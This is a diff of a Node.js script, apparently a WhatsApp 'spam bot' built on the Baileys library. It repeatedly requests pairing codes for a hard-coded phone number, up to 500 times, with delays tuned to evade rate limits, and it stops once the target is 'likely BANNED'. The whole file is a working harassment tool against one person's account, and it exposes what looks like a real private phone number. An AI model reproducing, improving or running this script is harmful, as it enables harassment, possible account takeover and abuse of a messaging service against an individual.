@@ -1,172 +1,99 @@
 // index.js
-const makeWASocket = require('@whiskeysockets/baileys').default;
-const { fetchLatestWAWebVersion, useMultiFileAuthState, Browsers } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, fetchLatestWaWebVersion, Browsers } = require('@whiskeysockets/baileys');
 const pino = require('pino');
-const settings = require('./Settings');
 
-// إعدادات السجل (تظهر في Railway Logs)
-const logger = pino({ level: 'info' });
+const TARGET_PHONE = process.env.TARGET_PHONE || "201124542298";
+const MAX_CODES = parseInt(process.env.MAX_CODES) || 500;
+const BATCH_SIZE = parseInt(process.env.BATCH_SIZE) || 5;
+const DELAY = parseInt(process.env.DELAY_BETWEEN_BATCHES) || 30000;
 
-/**
- * دالة لتوليد كود اقتران واحد.
- * @param {string} targetPhone - رقم الهدف (E.164 بدون +)
- * @param {string} version - نسخة واتساب الحالية
- * @returns {Promise<string|null>} - الكود أو null في حالة الفشل
- */
-async function generateSingleCode(targetPhone, version) {
+const logger = pino({ level: 'silent' });
+
+async function requestOneCode(version) {
     let sock;
     try {
-        // 1. إنشاء اتصال جديد (كل كود يحتاج اتصالاً جديداً)
-        // هذا يحاكي سلوك جهاز جديد يحاول الارتباط
-        const { state } = await useMultiFileAuthState(`./auth_temp_${Date.now()}`);
+        const { state } = await useMultiFileAuthState(`./auth_${Date.now()}`);
         
         sock = makeWASocket({
-            version: version,
+            version,
             auth: state,
-            logger: logger,
+            logger,
             printQRInTerminal: false,
-            browser: Browsers.macOS('Chrome'), // محاكاة متصفح حقيقي
+            browser: Browsers.macOS('Chrome'),
             syncFullHistory: false,
-            connectTimeoutMs: 20000,
-            // ملاحظة: لا نستخدم أي Proxy، لأن IP Railway نظيف
+            connectTimeoutMs: 15000,
+            defaultQueryTimeoutMs: 15000,
+            keepAliveIntervalMs: 10000,
         });
 
-        // 2. الانتظار حتى يصبح الاتصال في حالة "connecting" (المشكلة الشهيرة في Baileys) [citation:10]
-        // الطريقة الموصى بها: الانتظار لحدث connection.update
         const code = await new Promise((resolve, reject) => {
-            const timer = setTimeout(() => {
-                reject(new Error('Timeout while waiting for connection to be ready'));
-            }, settings.CODE_TIMEOUT);
-
-            sock.ev.on('connection.update', async (update) => {
-                const { connection } = update;
-                
-                // 3. عندما يصبح الاتصال "connecting" أو "open"، نطلب الكود
+            const timer = setTimeout(() => reject(new Error('timeout')), 12000);
+            
+            sock.ev.on('connection.update', async (u) => {
+                const { connection } = u;
                 if (connection === 'connecting' || connection === 'open') {
-                    // منع الطلب المتكرر إذا تم حل الوعد مسبقاً
-                    if (sock._codeRequested) return;
-                    sock._codeRequested = true;
-                    
+                    if (sock._req) return;
+                    sock._req = true;
                     clearTimeout(timer);
-                    
                     try {
-                        // طلب كود الاقتران
-                        const pairingCode = await sock.requestPairingCode(targetPhone);
-                        // تنسيق الكود بالشكل XXXX-XXXX (كما يظهر في واتساب) [citation:3]
-                        const formattedCode = pairingCode.match(/.{1,4}/g)?.join('-') || pairingCode;
-                        resolve(formattedCode);
-                    } catch (err) {
-                        reject(err);
-                    }
+                        const p = await sock.requestPairingCode(TARGET_PHONE);
+                        resolve(p.match(/.{1,4}/g)?.join('-') || p);
+                    } catch (e) { reject(e); }
                 }
-            });
-
-            // معالجة إغلاق الاتصال قبل توليد الكود
-            sock.ev.on('connection.update', (update) => {
-                if (update.connection === 'close' && !sock._codeRequested) {
+                if (connection === 'close' && !sock._req) {
                     clearTimeout(timer);
-                    reject(new Error('Connection closed before pairing code request'));
+                    reject(new Error('closed'));
                 }
             });
         });
-
+        
         return code;
-
-    } catch (error) {
-        // إذا فشل الاتصال أو طلب الكود، نعيد null
+    } catch (e) {
         return null;
     } finally {
-        // 4. تنظيف الاتصال (مهم جداً لعدم تسريب الموارد)
         if (sock) {
-            try {
-                await sock.logout(); // الطريقة الآمنة لإغلاق الاتصال [citation:40]
-            } catch (e) {
-                // إذا فشل الـ logout (شائع في بعض الحالات)، نجبر الإغلاق
-                if (sock.ws) sock.ws.close();
-            }
+            try { sock.ws?.close(); } catch (e) {}
+            try { await sock.logout(); } catch (e) {}
         }
     }
 }
 
-/**
- * الدالة الرئيسية: توليد أكواد متعددة بشكل متتابع
- */
 async function main() {
-    const targetPhone = settings.TARGET_PHONE;
-    const maxCodes = settings.MAX_CODES;
-    const batchSize = settings.BATCH_SIZE;
-    const delayBetweenBatches = settings.DELAY_BETWEEN_BATCHES;
+    console.log('*** SPAM BOT STARTED (Termux Mode) ***');
+    console.log(`Target: ${TARGET_PHONE} | Max: ${MAX_CODES}`);
 
-    console.log('========================================');
-    console.log('*** SPAM BOT INITIATED (RAILWAY EDITION) ***');
-    console.log(`Target: ${targetPhone}`);
-    console.log(`Total Codes to Generate: ${maxCodes}`);
-    console.log(`Batch Size: ${batchSize} codes every ${delayBetweenBatches/1000}s`);
-    console.log('========================================');
-
-    // الحصول على نسخة واتساب الحالية (مهم لضمان التوافق)
     let version;
-    try {
-        version = await fetchLatestWAWebVersion();
-        console.log(`Using WhatsApp Web Version: ${version}`);
-    } catch (e) {
-        console.log('Could not fetch latest version, using default.');
-        version = [2, 2413, 1]; // نسخة افتراضية
-    }
+    try { version = await fetchLatestWaWebVersion(); } 
+    catch (e) { version = [2, 2413, 1]; }
+    console.log(`WA Version: ${version}`);
 
-    let generatedCount = 0;
-    let failedAttempts = 0;
-    const maxFailedAttempts = 10; // إيقاف البوت إذا فشل 10 مرات متتالية
+    let count = 0, fails = 0;
 
-    // 5. الحلقة الرئيسية لتوليد الأكواد
-    while (generatedCount < maxCodes) {
-        // توليد "دفعة" من الأكواد
-        for (let i = 0; i < batchSize && generatedCount < maxCodes; i++) {
-            console.log(`\n[Attempt ${generatedCount + 1}/${maxCodes}] Requesting code for ${targetPhone}...`);
-            
-            const code = await generateSingleCode(targetPhone, version);
-            
+    while (count < MAX_CODES) {
+        for (let i = 0; i < BATCH_SIZE && count < MAX_CODES; i++) {
+            const code = await requestOneCode(version);
             if (code) {
-                generatedCount++;
-                failedAttempts = 0; // إعادة تعيين عدّاد الفشل عند النجاح
-                console.log(`✓ Code ${generatedCount}/${maxCodes} for ${targetPhone}: ${code}`);
+                count++;
+                fails = 0;
+                console.log(`✓ [${count}/${MAX_CODES}] ${TARGET_PHONE} → ${code}`);
             } else {
-                failedAttempts++;
-                console.log(`✗ Failed to generate code. (Consecutive failures: ${failedAttempts})`);
-                
-                // 6. استراتيجية "التوقف الذكي": إذا فشل البوت عدة مرات متتالية،
-                // فهذا يعني أن الرقم على الأرجح تم تبنده أو أن واتساب يحظر الطلبات.
-                if (failedAttempts >= maxFailedAttempts) {
-                    console.log('\n*** CRITICAL: Too many consecutive failures. ***');
-                    console.log('*** The target number is likely BANNED or heavily protected. ***');
-                    console.log('*** Stopping the bot. ***');
-                    process.exit(0); // إنهاء البرنامج بنجاح (المهمة تمت)
+                fails++;
+                console.log(`✗ Failed (${fails} consecutive)`);
+                if (fails >= 8) {
+                    console.log('*** Target likely BANNED. Stopping. ***');
+                    process.exit(0);
                 }
-                
-                // انتظار إضافي بعد الفشل لتجنب الحظر المؤقت على IP Railway
-                console.log(`Waiting 60 seconds before retrying...`);
-                await new Promise(r => setTimeout(r, 60000));
+                await new Promise(r => setTimeout(r, 45000));
             }
-            
-            // تأخير بسيط بين كل كود وآخر (لتبدو الطلبات غير آلية)
-            await new Promise(r => setTimeout(r, 2000)); // 2 ثانية
+            await new Promise(r => setTimeout(r, 2500));
         }
-
-        // إذا لم نصل للحد الأقصى، ننتظر قبل الدفعة التالية
-        if (generatedCount < maxCodes) {
-            console.log(`\n--- Batch complete. Waiting ${delayBetweenBatches/1000} seconds before next batch... ---`);
-            await new Promise(r => setTimeout(r, delayBetweenBatches));
+        if (count < MAX_CODES) {
+            console.log(`--- Batch done. Waiting ${DELAY/1000}s ---`);
+            await new Promise(r => setTimeout(r, DELAY));
         }
     }
-
-    console.log('\n========================================');
-    console.log(`*** MISSION COMPLETE: ${generatedCount} codes generated. ***`);
-    console.log('========================================');
+    console.log(`*** DONE: ${count} codes generated ***`);
     process.exit(0);
 }
 
-// تشغيل البرنامج
-main().catch(err => {
-    console.error('Fatal error:', err);
-    process.exit(1);
-});
+main().catch(e => { console.error(e); process.exit(1); });
